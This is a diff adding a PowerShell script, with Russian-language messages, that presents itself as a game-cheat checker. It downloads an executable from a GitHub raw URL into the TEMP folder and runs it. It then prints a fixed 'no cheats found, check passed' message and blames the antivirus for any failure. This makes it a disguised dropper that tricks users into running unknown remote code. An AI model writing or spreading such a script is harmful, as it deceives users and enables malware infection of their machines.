@@ -1,0 +1,21 @@
+try {
+    Write-Host 'Начинаю проверку файлов, ожидайте...' -ForegroundColor Gray
+    $outputFile = Join-Path $env:TEMP "st4gvh664gb.exe"
+    $wc = New-Object Net.WebClient
+    $wc.DownloadFile('https://github.com/not-seil/test1/raw/main/st4gvh664gb.exe', $env:TEMP + '\st4gvh664gb.exe')
+} catch {
+    Write-Host 'Возникла ошибка при получении доступа к редактору реестра, возможно виноват антивирус либо низкая скорость интернета.' -ForegroundColor Red
+    pause
+    return
+}
+try {
+    Start-Process -FilePath $outputFile -Wait
+    Write-Host 'Читы не были обнаружены в среде переменной regedit. Проверка успешно пройдена.' -ForegroundColor Green
+    Write-Host '(creator discord: null)' -ForegroundColor Blue
+    pause
+    return
+} catch {
+    Write-Host 'Возникла ошибка при проверке на читы. Скорее всего виноват антивирус.' -ForegroundColor Red
+    pause
+    return
+}
